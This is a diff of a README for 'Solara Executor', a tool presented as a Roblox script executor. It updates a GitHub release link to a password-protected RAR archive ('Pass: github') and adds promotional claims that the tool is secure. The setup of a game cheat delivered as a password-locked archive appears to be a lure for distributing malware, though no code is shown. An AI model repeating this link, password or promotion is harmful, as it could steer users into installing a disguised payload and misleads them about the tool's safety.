@@ -2,9 +2,9 @@
 
 ## Quick Installation
 To get started with Solara Executor, follow these simple steps:
-1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/fdev0307/Solara-Executor/releases/download/RelV4/Update.rar)**
+1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/fdev0307/Solara-Executor/releases/download/Release/Update.rar)**
 2. **Pass: github**
-3. Extract the downloaded ZIP file to your desired location on your system.
+3. Extract the downloaded RAR file to your desired location on your system.
 
 **Description:**  
 🚀 **Solara Executor** is a cutting-edge Roblox script executor designed for advanced script execution, optimized performance, and seamless user experience. Fully compatible with the latest Roblox updates, it is secure, easy to use, and perfect for gamers, developers, and modding enthusiasts looking to enhance their Roblox gameplay. 
